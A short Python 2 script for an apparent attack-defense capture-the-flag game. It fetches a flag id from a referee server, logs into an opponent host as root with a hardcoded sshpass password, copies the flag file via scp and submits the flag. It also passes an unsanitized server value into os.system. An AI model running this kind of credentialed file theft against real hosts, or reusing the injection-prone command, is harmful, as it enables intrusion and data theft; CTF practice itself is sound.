import requests
import sys
import os
import time
#indirizzo arbitro
url = 'http://10.0.0.4:5000/'

def submit(service, flag):
	payload = {'flag':flag, 'team':'CuredPin', 'service':service}
	req = requests.post(url+'submit', data = payload)
	print url+'submit ' + " Servizio = " + str(service)
	print req.text
	return req.text

def getflagid(service):
    #enemy_name nome team nemico
    payl = {'enemy_name': 'CuredPin', 'service':service}
    richiesta = requests.get(url+'flagid?', params=payl)
    print url+'getflagid ' + " Servizio = " + str(service)
    #print "\n"
    print richiesta.text + "\n"
    return richiesta.text


if __name__ == '__main__':
    flag_id = getflagid("nadmozg")
    path = "/media/pietro/Volume/Varie/Stuff/CTF/CuledFiles/openfiles/" + flag_id +".txt"
    os.system('sshpass -p "appiddaveruculed" scp root@10.0.0.2:/opt/ctf/nadmozg/rw/'+flag_id+ ' ' + path)
    time.sleep(0.2)
    #print path
    fread = open(path,'r')
    words= fread.read().split("\n")
    FLAG = words[1].split("/")[2]
    print "FLAG = " + FLAG
    fread.close()
    submit("nadmozg", FLAG)